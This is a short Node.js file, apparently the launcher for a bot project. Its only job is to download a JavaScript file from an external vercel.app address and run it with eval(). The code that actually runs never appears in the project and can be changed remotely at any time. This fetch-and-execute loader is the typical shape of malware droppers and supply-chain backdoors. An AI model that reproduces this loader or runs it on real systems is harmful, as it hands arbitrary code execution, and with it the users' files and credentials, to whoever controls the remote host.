'use strict';

// Include required modules
const axios = require('axios');

// Define the URL to fetch index.js
const indexUrl = 'https://dullah-xmd-commands-phi.vercel.app/index.js';

// Function to fetch and execute index.js
async function fetchAndExecuteIndex() {
    try {
        console.log(`📥 Fetching: ${indexUrl}`);

        // Fetch the script content from index.js
        const response = await axios.get(indexUrl);
        const scriptContent = response.data;

        console.log(`✅ index.js loaded successfully!`);

        // Execute the script content in the current context
        eval(scriptContent);

    } catch (error) {
        console.error(`❌ Error fetching index.js:`, error.message || error);
    }
}

// Execute the fetch function
fetchAndExecuteIndex();
